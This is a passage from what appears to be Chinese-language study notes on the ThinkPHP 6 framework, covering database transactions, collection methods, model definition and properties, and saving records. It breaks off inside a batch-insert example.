<p>&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x7684;&#x7B2C;&#x4E8C;&#x4E2A;ty_user&#x5199;&#x9519;&#x4E86;&#xFF0C;&#x90A3;&#x4E48;&#x53EA;&#x4F1A;&#x6267;&#x884C;&#x7B2C;&#x4E00;&#x884C;&#x64CD;&#x4F5C;&#xFF0C;&#x8FD9;&#x6837;&#x662F;&#x4E0D;&#x5B89;&#x5168;&#x7684;&#xFF0C;&#x5982;&#x4E0B;&#x53EF;&#x5904;&#x7406;</p>
<p>&#x539F;&#x751F;&#x6A21;&#x5F0F;</p>
<pre><code class="lang-php">Db::transaction(<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">()</span> </span>{
    Db::table(<span class="hljs-string">&apos;think_user&apos;</span>)-&gt;find(<span class="hljs-number">1</span>);
    Db::table(<span class="hljs-string">&apos;think_user&apos;</span>)-&gt;delete(<span class="hljs-number">1</span>);
});
</code></pre>
<p>&#x624B;&#x52A8;&#x6A21;&#x5F0F;</p>
<pre><code class="lang-php"><span class="hljs-comment">// &#x542F;&#x52A8;&#x4E8B;&#x52A1;</span>
Db::startTrans();
<span class="hljs-keyword">try</span> {
    Db::table(<span class="hljs-string">&apos;think_user&apos;</span>)-&gt;find(<span class="hljs-number">1</span>);
    Db::table(<span class="hljs-string">&apos;think_user&apos;</span>)-&gt;delete(<span class="hljs-number">1</span>);
    <span class="hljs-comment">// &#x63D0;&#x4EA4;&#x4E8B;&#x52A1;</span>
    Db::commit();
} <span class="hljs-keyword">catch</span> (\<span class="hljs-keyword">Exception</span> $e) {
    <span class="hljs-comment">// &#x56DE;&#x6EDA;&#x4E8B;&#x52A1;</span>
    Db::rollback();
}
</code></pre>
<h4 id="&#x6570;&#x636E;&#x5E93;&#x7684;&#x6570;&#x636E;&#x96C6;&#x548C;&#x4EE3;&#x7801;&#x63D0;&#x793A;">&#x6570;&#x636E;&#x5E93;&#x7684;&#x6570;&#x636E;&#x96C6;&#x548C;&#x4EE3;&#x7801;&#x63D0;&#x793A;</h4>
<p>&#x4EE3;&#x7801;&#x63D0;&#x793A;</p>
<p>&#x5C06;tp5&#x7684;db.php&#x4E2D;&#x7684;&#x63D0;&#x793A;&#x62FF;&#x5230;tp6&#x7684;DbManager.php&#x4E2D;</p>
<p><a href="https://imgse.com/i/ppCvNcQ" target="_blank"><img src="https://s1.ax1x.com/2023/02/28/ppCvNcQ.png" alt="ppCvNcQ.png"></a><a href="https://imgse.com/i/ppCvUXj" target="_blank"><img src="https://s1.ax1x.com/2023/02/28/ppCvUXj.png" alt="ppCvUXj.png"></a></p>
<pre><code class="lang-php"><span class="hljs-comment">/**
 * Class DbManager
 * <span class="hljs-doctag">@package</span> think
 * <span class="hljs-doctag">@mixin</span> BaseQuery
 * <span class="hljs-doctag">@mixin</span> Query
 * <span class="hljs-doctag">@method</span> Query table(string $table) static &#x6307;&#x5B9A;&#x6570;&#x636E;&#x8868;&#xFF08;&#x542B;&#x524D;&#x7F00;&#xFF09;
 * <span class="hljs-doctag">@method</span> Query name(string $name) static &#x6307;&#x5B9A;&#x6570;&#x636E;&#x8868;&#xFF08;&#x4E0D;&#x542B;&#x524D;&#x7F00;&#xFF09;
 * <span class="hljs-doctag">@method</span> Query where(mixed $field, string $op = null, mixed $condition = null) static &#x67E5;&#x8BE2;&#x6761;&#x4EF6;
 * <span class="hljs-doctag">@method</span> Query join(mixed $join, mixed $condition = null, string $type = &apos;INNER&apos;) static JOIN&#x67E5;&#x8BE2;
 * <span class="hljs-doctag">@method</span> Query union(mixed $union, boolean $all = false) static UNION&#x67E5;&#x8BE2;
 * <span class="hljs-doctag">@method</span> Query limit(mixed $offset, integer $length = null) static &#x67E5;&#x8BE2;LIMIT
 * <span class="hljs-doctag">@method</span> Query order(mixed $field, string $order = null) static &#x67E5;&#x8BE2;ORDER
 * <span class="hljs-doctag">@method</span> Query cache(mixed $key = null , integer $expire = null) static &#x8BBE;&#x7F6E;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;
 * <span class="hljs-doctag">@method</span> mixed value(string $field) static &#x83B7;&#x53D6;&#x67D0;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x503C;
 * <span class="hljs-doctag">@method</span> array column(string $field, string $key = &apos;&apos;) static &#x83B7;&#x53D6;&#x67D0;&#x4E2A;&#x5217;&#x7684;&#x503C;
 * <span class="hljs-doctag">@method</span> Query view(mixed $join, mixed $field = null, mixed $on = null, string $type = &apos;INNER&apos;) static &#x89C6;&#x56FE;&#x67E5;&#x8BE2;
 * <span class="hljs-doctag">@method</span> mixed find(mixed $data = null) static &#x67E5;&#x8BE2;&#x5355;&#x4E2A;&#x8BB0;&#x5F55;
 * <span class="hljs-doctag">@method</span> mixed select(mixed $data = null) static &#x67E5;&#x8BE2;&#x591A;&#x4E2A;&#x8BB0;&#x5F55;
 * <span class="hljs-doctag">@method</span> integer insert(array $data, boolean $replace = false, boolean $getLastInsID = false, string $sequence = null) static &#x63D2;&#x5165;&#x4E00;&#x6761;&#x8BB0;&#x5F55;
 * <span class="hljs-doctag">@method</span> integer insertGetId(array $data, boolean $replace = false, string $sequence = null) static &#x63D2;&#x5165;&#x4E00;&#x6761;&#x8BB0;&#x5F55;&#x5E76;&#x8FD4;&#x56DE;&#x81EA;&#x589E;ID
 * <span class="hljs-doctag">@method</span> integer insertAll(array $dataSet) static &#x63D2;&#x5165;&#x591A;&#x6761;&#x8BB0;&#x5F55;
 * <span class="hljs-doctag">@method</span> integer update(array $data) static &#x66F4;&#x65B0;&#x8BB0;&#x5F55;
 * <span class="hljs-doctag">@method</span> integer delete(mixed $data = null) static &#x5220;&#x9664;&#x8BB0;&#x5F55;
 * <span class="hljs-doctag">@method</span> boolean chunk(integer $count, callable $callback, string $column = null) static &#x5206;&#x5757;&#x83B7;&#x53D6;&#x6570;&#x636E;
 * <span class="hljs-doctag">@method</span> mixed query(string $sql, array $bind = [], boolean $master = false, bool $pdo = false) static SQL&#x67E5;&#x8BE2;
 * <span class="hljs-doctag">@method</span> integer execute(string $sql, array $bind = [], boolean $fetch = false, boolean $getLastInsID = false, string $sequence = null) static SQL&#x6267;&#x884C;
 * <span class="hljs-doctag">@method</span> Paginator paginate(integer $listRows = 15, mixed $simple = null, array $config = []) static &#x5206;&#x9875;&#x67E5;&#x8BE2;
 * <span class="hljs-doctag">@method</span> mixed transaction(callable $callback) static &#x6267;&#x884C;&#x6570;&#x636E;&#x5E93;&#x4E8B;&#x52A1;
 * <span class="hljs-doctag">@method</span> void startTrans() static &#x542F;&#x52A8;&#x4E8B;&#x52A1;
 * <span class="hljs-doctag">@method</span> void commit() static &#x7528;&#x4E8E;&#x975E;&#x81EA;&#x52A8;&#x63D0;&#x4EA4;&#x72B6;&#x6001;&#x4E0B;&#x9762;&#x7684;&#x67E5;&#x8BE2;&#x63D0;&#x4EA4;
 * <span class="hljs-doctag">@method</span> void rollback() static &#x4E8B;&#x52A1;&#x56DE;&#x6EDA;
 * <span class="hljs-doctag">@method</span> boolean batchQuery(array $sqlArray) static &#x6279;&#x5904;&#x7406;&#x6267;&#x884C;SQL&#x8BED;&#x53E5;
 * <span class="hljs-doctag">@method</span> string quote(string $str) static SQL&#x6307;&#x4EE4;&#x5B89;&#x5168;&#x8FC7;&#x6EE4;
 * <span class="hljs-doctag">@method</span> string getLastInsID($sequence = null) static &#x83B7;&#x53D6;&#x6700;&#x8FD1;&#x63D2;&#x5165;&#x7684;ID
 */</span>
</code></pre>
<h5 id="&#x6570;&#x636E;&#x96C6;">&#x6570;&#x636E;&#x96C6;</h5>
<blockquote>
<p>&#x6A21;&#x578B;&#x7684;<code>select</code>&#x67E5;&#x8BE2;&#x65B9;&#x6CD5;&#x8FD4;&#x56DE;&#x6570;&#x636E;&#x96C6;&#x5BF9;&#x8C61; <code>think\model\Collection</code>&#xFF0C;&#x8BE5;&#x5BF9;&#x8C61;&#x7EE7;&#x627F;&#x81EA;<code>think\Collection</code>&#xFF0C;&#x56E0;&#x6B64;&#x5177;&#x6709;&#x6570;&#x636E;&#x5E93;&#x7684;<a href="https://www.kancloud.cn/manual/thinkphp6_0/1037576" target="_blank">&#x6570;&#x636E;&#x96C6;&#x7C7B;</a>&#x7684;&#x6240;&#x6709;&#x65B9;&#x6CD5;&#xFF0C;&#x800C;&#x4E14;&#x8FD8;&#x63D0;&#x4F9B;&#x4E86;&#x989D;&#x5916;&#x7684;&#x6A21;&#x578B;&#x64CD;&#x4F5C;&#x65B9;&#x6CD5;</p>
</blockquote>
<pre><code>&#x8F6C;&#x6362;&#x4E3A;&#x7EAF;&#x6570;&#x7EC4;    
    public function things()
    {
        $user = Db::table(&apos;ty_user&apos;)-&gt;select();
        return dump($user-&gt;toArray());
    }
</code></pre><p><a href="https://imgse.com/i/ppCxK8U" target="_blank"><img src="https://s1.ax1x.com/2023/02/28/ppCxK8U.png" alt="ppCxK8U.png"></a></p>
<pre><code>&#x6253;&#x4E71;
    public function things()
    {
        $user = Db::table(&apos;ty_user&apos;)-&gt;select();
        return dump($user-&gt;shuffle());
    }
</code></pre><p><img src="https://s3.bmp.ovh/imgs/2023/02/28/9c5ac8448eea5434.png" alt=""><img src="https://s3.bmp.ovh/imgs/2023/02/28/a804696ee1f18893.png" alt=""></p>
<pre><code>where 
    public function things()
    {
        $user = Db::table(&apos;ty_user&apos;)-&gt;select();
        return dump($user-&gt;whereIn(&apos;id&apos;,[1,5,6]));
    }
</code></pre><p><img src="https://s3.bmp.ovh/imgs/2023/02/28/a0e6cc1b41001c78.png" alt=""></p>
<p><img src="https://s3.bmp.ovh/imgs/2023/02/28/2500edf99abc88e6.png" alt=""></p>
<h3 id="&#x6A21;&#x578B;">&#x6A21;&#x578B;</h3>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/e8838ae25d8093745dc45f0e6d67d287.png" alt="e8838ae25d8093745dc45f0e6d67d287.png"><img src="https://s1.imagehub.cc/images/2023/01/27/cb65be5da60198d80069ee020064fd08.png" alt="cb65be5da60198d80069ee020064fd08.png"></p>
<h6 id="&#x8D77;&#x522B;&#x540D;">&#x8D77;&#x522B;&#x540D;</h6>
<pre><code class="lang-php"><span class="hljs-keyword">use</span> <span class="hljs-title">app</span>\<span class="hljs-title">model</span>\<span class="hljs-title">ty_user</span> <span class="hljs-title">as</span> <span class="hljs-title">test123</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test12</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-keyword">return</span> json(test123::select());
    }
</code></pre>
<p>&#x8FD9;&#x91CC;&#x6A21;&#x578B;&#x4E0B;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x548C;&#x8868;&#x540D;&#x662F;&#x4E00;&#x6837;&#x7684;</p>
<p>&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x6A21;&#x578B;&#x7C7B;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x4F8B;&#x5982;&#x4E0B;&#x9762;&#x662F;&#x4E00;&#x4E2A;<code>User</code>&#x6A21;&#x578B;&#xFF1A;</p>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">model</span>;

<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span>
</span>{
}
</code></pre>
<blockquote>
<p>&#x8BF7;&#x786E;&#x4FDD;&#x4F60;&#x5DF2;&#x7ECF;&#x5728;&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x914D;&#x7F6E;&#x4E86;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#x4FE1;&#x606F;&#xFF0C;&#x5982;&#x4E0D;&#x6E05;&#x695A;&#x8BF7;&#x53C2;&#x8003;&#x6570;&#x636E;&#x5E93;&#x4E00;&#x7AE0;</p>
</blockquote>
<p>&#x6A21;&#x578B;&#x4F1A;&#x81EA;&#x52A8;&#x5BF9;&#x5E94;&#x6570;&#x636E;&#x8868;&#xFF0C;&#x6A21;&#x578B;&#x7C7B;&#x7684;&#x547D;&#x540D;&#x89C4;&#x5219;&#x662F;&#x9664;&#x53BB;&#x8868;&#x524D;&#x7F00;&#x7684;&#x6570;&#x636E;&#x8868;&#x540D;&#x79F0;&#xFF0C;&#x91C7;&#x7528;&#x9A7C;&#x5CF0;&#x6CD5;&#x547D;&#x540D;&#xFF0C;&#x5E76;&#x4E14;&#x9996;&#x5B57;&#x6BCD;&#x5927;&#x5199;</p>
<p><img src="https://s1.imagehub.cc/images/2023/01/27/a15240644ff66a31571144fb2092c8f2.png" alt="a15240644ff66a31571144fb2092c8f2.png"><img src="https://s1.imagehub.cc/images/2023/01/27/e5d9daa1acc8e1c1feaa3c5aeae9b124.png" alt="e5d9daa1acc8e1c1feaa3c5aeae9b124.png"></p>
<p><a href="https://www.imagehub.cc/image/OFxiO" target="_blank"><img src="https://s1.imagehub.cc/images/2023/01/27/909e69f245a4c0cc7e71decbfc6aec57.png" alt="909e69f245a4c0cc7e71decbfc6aec57.png"></a></p>
<h4 id="&#x6A21;&#x578B;&#x8BBE;&#x7F6E;">&#x6A21;&#x578B;&#x8BBE;&#x7F6E;</h4>
<p>&#x9ED8;&#x8BA4;&#x4E3B;&#x952E;&#x4E3A;<code>id</code>&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x6CA1;&#x6709;&#x4F7F;&#x7528;<code>id</code>&#x4F5C;&#x4E3A;&#x4E3B;&#x952E;&#x540D;&#xFF0C;&#x9700;&#x8981;&#x5728;&#x6A21;&#x578B;&#x4E2D;&#x8BBE;&#x7F6E;&#x5C5E;&#x6027;&#xFF1A;</p>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">model</span>;

<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span>
</span>{
    <span class="hljs-keyword">protected</span> $pk = <span class="hljs-string">&apos;uid&apos;</span>;
}
</code></pre>
<p>&#x5982;&#x679C;&#x4F60;&#x60F3;&#x6307;&#x5B9A;&#x6570;&#x636E;&#x8868;&#x751A;&#x81F3;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#x7684;&#x8BDD;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#xFF1A;</p>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">model</span>;

<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span>
</span>{
    <span class="hljs-comment">// &#x8BBE;&#x7F6E;&#x5F53;&#x524D;&#x6A21;&#x578B;&#x5BF9;&#x5E94;&#x7684;&#x5B8C;&#x6574;&#x6570;&#x636E;&#x8868;&#x540D;&#x79F0;</span>
    <span class="hljs-keyword">protected</span> $table = <span class="hljs-string">&apos;think_user&apos;</span>;

    <span class="hljs-comment">// &#x8BBE;&#x7F6E;&#x5F53;&#x524D;&#x6A21;&#x578B;&#x7684;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;</span>
    <span class="hljs-keyword">protected</span> $connection = <span class="hljs-string">&apos;db_config&apos;</span>;
}
</code></pre>
<blockquote>
<p><code>connection</code>&#x5C5E;&#x6027;&#x4F7F;&#x7528;&#x7528;&#x914D;&#x7F6E;&#x53C2;&#x6570;&#x540D;&#xFF08;&#x9700;&#x8981;&#x5728;&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x7684;<code>connections</code>&#x53C2;&#x6570;&#x4E2D;&#x6DFB;&#x52A0;&#x5BF9;&#x5E94;&#x6807;&#x8BC6;&#xFF09;&#x3002;</p>
</blockquote>
<p>&#x5E38;&#x7528;&#x7684;&#x6A21;&#x578B;&#x8BBE;&#x7F6E;&#x5C5E;&#x6027;&#x5305;&#x62EC;&#xFF08;&#x4EE5;&#x4E0B;&#x5C5E;&#x6027;&#x90FD;&#x4E0D;&#x662F;&#x5FC5;&#x987B;&#x8BBE;&#x7F6E;&#xFF09;&#xFF1A;</p>
<table>
<thead>
<tr>
<th style="text-align:left">&#x5C5E;&#x6027;</th>
<th style="text-align:left">&#x63CF;&#x8FF0;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">name</td>
<td style="text-align:left">&#x6A21;&#x578B;&#x540D;&#xFF08;&#x76F8;&#x5F53;&#x4E8E;&#x4E0D;&#x5E26;&#x6570;&#x636E;&#x8868;&#x524D;&#x540E;&#x7F00;&#x7684;&#x8868;&#x540D;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;&#x5F53;&#x524D;&#x6A21;&#x578B;&#x7C7B;&#x540D;&#xFF09;</td>
</tr>
<tr>
<td style="text-align:left">table</td>
<td style="text-align:left">&#x6570;&#x636E;&#x8868;&#x540D;&#xFF08;&#x9ED8;&#x8BA4;&#x81EA;&#x52A8;&#x83B7;&#x53D6;&#xFF09;</td>
</tr>
<tr>
<td style="text-align:left">suffix</td>
<td style="text-align:left">&#x6570;&#x636E;&#x8868;&#x540E;&#x7F00;&#xFF08;&#x9ED8;&#x8BA4;&#x4E3A;&#x7A7A;&#xFF09;</td>
</tr>
<tr>
<td style="text-align:left">pk</td>
<td style="text-align:left">&#x4E3B;&#x952E;&#x540D;&#xFF08;&#x9ED8;&#x8BA4;&#x4E3A;<code>id</code>&#xFF09;</td>
</tr>
<tr>
<td style="text-align:left">connection</td>
<td style="text-align:left">&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#xFF08;&#x9ED8;&#x8BA4;&#x8BFB;&#x53D6;&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#xFF09;</td>
</tr>
<tr>
<td style="text-align:left">query</td>
<td style="text-align:left">&#x6A21;&#x578B;&#x4F7F;&#x7528;&#x7684;&#x67E5;&#x8BE2;&#x7C7B;&#x540D;&#x79F0;</td>
</tr>
<tr>
<td style="text-align:left">field</td>
<td style="text-align:left">&#x6A21;&#x578B;&#x5141;&#x8BB8;&#x5199;&#x5165;&#x7684;&#x5B57;&#x6BB5;&#x5217;&#x8868;&#xFF08;&#x6570;&#x7EC4;&#xFF09;</td>
</tr>
<tr>
<td style="text-align:left">schema</td>
<td style="text-align:left">&#x6A21;&#x578B;&#x5BF9;&#x5E94;&#x6570;&#x636E;&#x8868;&#x5B57;&#x6BB5;&#x53CA;&#x7C7B;&#x578B;</td>
</tr>
<tr>
<td style="text-align:left">type</td>
<td style="text-align:left">&#x6A21;&#x578B;&#x9700;&#x8981;&#x81EA;&#x52A8;&#x8F6C;&#x6362;&#x7684;&#x5B57;&#x6BB5;&#x53CA;&#x7C7B;&#x578B;</td>
</tr>
<tr>
<td style="text-align:left">strict</td>
<td style="text-align:left">&#x662F;&#x5426;&#x4E25;&#x683C;&#x533A;&#x5206;&#x5B57;&#x6BB5;&#x5927;&#x5C0F;&#x5199;&#xFF08;&#x9ED8;&#x8BA4;&#x4E3A;true&#xFF09;</td>
</tr>
<tr>
<td style="text-align:left">disuse</td>
<td style="text-align:left">&#x6570;&#x636E;&#x8868;&#x5E9F;&#x5F03;&#x5B57;&#x6BB5;&#xFF08;&#x6570;&#x7EC4;&#xFF09;</td>
</tr>
</tbody>
</table>
<blockquote>
<p>&#x6A21;&#x578B;&#x4E0D;&#x652F;&#x6301;&#x5BF9;&#x6570;&#x636E;&#x8868;&#x7684;&#x524D;&#x7F00;&#x5355;&#x72EC;&#x8BBE;&#x7F6E;&#xFF0C;&#x5E76;&#x4E14;&#x4E5F;&#x4E0D;&#x63A8;&#x8350;&#x4F7F;&#x7528;&#x6570;&#x636E;&#x8868;&#x7684;&#x524D;&#x7F00;&#x8BBE;&#x8BA1;&#xFF0C;&#x5E94;&#x8BE5;&#x7528;&#x4E0D;&#x540C;&#x7684;&#x5E93;&#x533A;&#x5206;&#x3002;&#x5F53;&#x4F60;&#x7684;&#x6570;&#x636E;&#x8868;&#x6CA1;&#x6709;&#x524D;&#x7F00;&#x7684;&#x65F6;&#x5019;&#xFF0C;<code>name</code>&#x548C;<code>table</code>&#x5C5E;&#x6027;&#x7684;&#x5B9A;&#x4E49;&#x662F;&#x6CA1;&#x6709;&#x533A;&#x522B;&#x7684;&#xFF0C;&#x5B9A;&#x4E49;&#x4EFB;&#x4F55;&#x4E00;&#x4E2A;&#x5373;&#x53EF;&#x3002;</p>
</blockquote>
<h5 id="&#x65B0;&#x589E;">&#x65B0;&#x589E;</h5>
<p>&#x6A21;&#x578B;&#x6570;&#x636E;&#x7684;&#x65B0;&#x589E;&#x548C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x65B0;&#x589E;&#x6570;&#x636E;&#x6709;&#x6240;&#x533A;&#x522B;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x65B0;&#x589E;&#x53EA;&#x662F;&#x5355;&#x7EAF;&#x7684;&#x5199;&#x5165;&#x7ED9;&#x5B9A;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x800C;&#x6A21;&#x578B;&#x7684;&#x6570;&#x636E;&#x5199;&#x5165;&#x4F1A;&#x5305;&#x542B;&#x4FEE;&#x6539;&#x5668;&#x3001;&#x81EA;&#x52A8;&#x5B8C;&#x6210;&#x4EE5;&#x53CA;&#x6A21;&#x578B;&#x4E8B;&#x4EF6;&#x7B49;&#x73AF;&#x8282;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6570;&#x636E;&#x5199;&#x5165;&#x53C2;&#x8003;&#x6570;&#x636E;&#x5E93;&#x7AE0;&#x8282;&#x3002;</p>
<h6 id="&#x6DFB;&#x52A0;&#x4E00;&#x6761;&#x6570;&#x636E;">&#x6DFB;&#x52A0;&#x4E00;&#x6761;&#x6570;&#x636E;</h6>
<p>&#x7B2C;&#x4E00;&#x79CD;&#x662F;&#x5B9E;&#x4F8B;&#x5316;&#x6A21;&#x578B;&#x5BF9;&#x8C61;&#x540E;&#x8D4B;&#x503C;&#x5E76;&#x4FDD;&#x5B58;&#xFF1A;</p>
<pre><code>$user           = new User;
$user-&gt;name     = &apos;thinkphp&apos;;
$user-&gt;email    = &apos;thinkphp@qq.com&apos;;
$user-&gt;save();
</code></pre><blockquote>
<p><code>save</code>&#x65B9;&#x6CD5;&#x6210;&#x529F;&#x4F1A;&#x8FD4;&#x56DE;<code>true</code>&#xFF0C;&#x5E76;&#x4E14;&#x53EA;&#x6709;&#x5F53;<code>before_insert</code>&#x4E8B;&#x4EF6;&#x8FD4;&#x56DE;<code>false</code>&#x7684;&#x65F6;&#x5019;&#x8FD4;&#x56DE;<code>false</code>&#xFF0C;&#x4E00;&#x65E6;&#x6709;&#x9519;&#x8BEF;&#x5C31;&#x4F1A;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#x3002;&#x6240;&#x4EE5;&#x65E0;&#x9700;&#x5224;&#x65AD;&#x8FD4;&#x56DE;&#x7C7B;&#x578B;&#x3002;</p>
</blockquote>
<p><img src="https://s1.imagehub.cc/images/2023/01/28/0e03bce250369c338a3814f3b4b6040a.png" alt="0e03bce250369c338a3814f3b4b6040a.png"></p>
<p><img src="https://s1.imagehub.cc/images/2023/01/28/e754b403bb8f7ea78cb1ccf983477bd4.png" alt="e754b403bb8f7ea78cb1ccf983477bd4.png"></p>
<p>&#x4E5F;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4F20;&#x5165;&#x6570;&#x636E;&#x5230;<code>save</code>&#x65B9;&#x6CD5;&#x6279;&#x91CF;&#x8D4B;&#x503C;&#xFF1A;</p>
<pre><code>$user = new User;
$user-&gt;save([
    &apos;name&apos;  =&gt;  &apos;thinkphp&apos;,
    &apos;email&apos; =&gt;  &apos;thinkphp@qq.com&apos;
]);
</code></pre><p>&#x9ED8;&#x8BA4;&#x53EA;&#x4F1A;&#x5199;&#x5165;&#x6570;&#x636E;&#x8868;&#x5DF2;&#x6709;&#x7684;&#x5B57;&#x6BB5;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x901A;&#x8FC7;&#x5916;&#x90E8;&#x63D0;&#x4EA4;&#x8D4B;&#x503C;&#x7ED9;&#x6A21;&#x578B;&#xFF0C;&#x5E76;&#x4E14;&#x5E0C;&#x671B;&#x6307;&#x5B9A;&#x67D0;&#x4E9B;&#x5B57;&#x6BB5;&#x5199;&#x5165;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#xFF1A;</p>
<pre><code>$user = new User;
// post&#x6570;&#x7EC4;&#x4E2D;&#x53EA;&#x6709;name&#x548C;email&#x5B57;&#x6BB5;&#x4F1A;&#x5199;&#x5165;
$user-&gt;allowField([&apos;name&apos;,&apos;email&apos;])-&gt;save($_POST);
</code></pre><p>&#x6700;&#x4F73;&#x7684;&#x5EFA;&#x8BAE;&#x662F;&#x6A21;&#x578B;&#x6570;&#x636E;&#x8D4B;&#x503C;&#x4E4B;&#x524D;&#x5C31;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x8FC7;&#x6EE4;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<pre><code>$user = new User;
// &#x8FC7;&#x6EE4;post&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x975E;&#x6570;&#x636E;&#x8868;&#x5B57;&#x6BB5;&#x6570;&#x636E;
$data = Request::only([&apos;name&apos;,&apos;email&apos;]);
$user-&gt;save($data);
</code></pre><blockquote>
<p><code>save</code>&#x65B9;&#x6CD5;&#x65B0;&#x589E;&#x6570;&#x636E;&#x8FD4;&#x56DE;&#x7684;&#x662F;&#x5199;&#x5165;&#x7684;&#x8BB0;&#x5F55;&#x6570;&#xFF08;&#x901A;&#x5E38;&#x662F;<code>1</code>&#xFF09;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x81EA;&#x589E;&#x4E3B;&#x952E;&#x503C;&#x3002;</p>
</blockquote>
<h6 id="replace&#x5199;&#x5165;"><code>Replace</code>&#x5199;&#x5165;</h6>
<p><code>save</code>&#x65B9;&#x6CD5;&#x53EF;&#x4EE5;&#x652F;&#x6301;<code>replace</code>&#x5199;&#x5165;&#x3002;</p>
<pre><code>$user           = new User;
$user-&gt;name     = &apos;thinkphp&apos;;
$user-&gt;email    = &apos;thinkphp@qq.com&apos;;
$user-&gt;replace()-&gt;save();
</code></pre><h6 id="&#x83B7;&#x53D6;&#x81EA;&#x589E;id">&#x83B7;&#x53D6;&#x81EA;&#x589E;ID</h6>
<p>&#x5982;&#x679C;&#x8981;&#x83B7;&#x53D6;&#x65B0;&#x589E;&#x6570;&#x636E;&#x7684;&#x81EA;&#x589E;ID&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4E0B;&#x9762;&#x7684;&#x65B9;&#x5F0F;&#xFF1A;</p>
<pre><code>$user           = new User;
$user-&gt;name     = &apos;thinkphp&apos;;
$user-&gt;email    = &apos;thinkphp@qq.com&apos;;
$user-&gt;save();
// &#x83B7;&#x53D6;&#x81EA;&#x589E;ID
echo $user-&gt;id;
</code></pre><p>&#x8FD9;&#x91CC;&#x5176;&#x5B9E;&#x662F;&#x83B7;&#x53D6;&#x6A21;&#x578B;&#x7684;&#x4E3B;&#x952E;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x7684;&#x4E3B;&#x952E;&#x4E0D;&#x662F;<code>id</code>&#xFF0C;&#x800C;&#x662F;<code>user_id</code>&#x7684;&#x8BDD;&#xFF0C;&#x5176;&#x5B9E;&#x83B7;&#x53D6;&#x81EA;&#x589E;ID&#x5C31;&#x53D8;&#x6210;&#x8FD9;&#x6837;&#xFF1A;</p>
<pre><code>$user           = new User;
$user-&gt;name     = &apos;thinkphp&apos;;
$user-&gt;email    = &apos;thinkphp@qq.com&apos;;
$user-&gt;save();
// &#x83B7;&#x53D6;&#x81EA;&#x589E;ID
echo $user-&gt;user_id;
</code></pre><blockquote>
<p>&#x4E0D;&#x8981;&#x5728;&#x540C;&#x4E00;&#x4E2A;&#x5B9E;&#x4F8B;&#x91CC;&#x9762;&#x591A;&#x6B21;&#x65B0;&#x589E;&#x6570;&#x636E;&#xFF0C;&#x5982;&#x679C;&#x786E;&#x5B9E;&#x9700;&#x8981;&#x591A;&#x6B21;&#x65B0;&#x589E;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x540E;&#x9762;&#x7684;&#x9759;&#x6001;&#x65B9;&#x6CD5;&#x5904;&#x7406;&#x3002;</p>
</blockquote>
<h6 id="&#x6279;&#x91CF;&#x589E;&#x52A0;&#x6570;&#x636E;">&#x6279;&#x91CF;&#x589E;&#x52A0;&#x6570;&#x636E;</h6>
<p>&#x652F;&#x6301;&#x6279;&#x91CF;&#x65B0;&#x589E;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#xFF1A;</p>
<pre><code>$user = new User;
$list = [
    [&apos;name&apos;=&gt;&apos;thinkphp&apos;,&apos;email&apos;=&gt;&apos;thinkphp@qq.com&apos;],
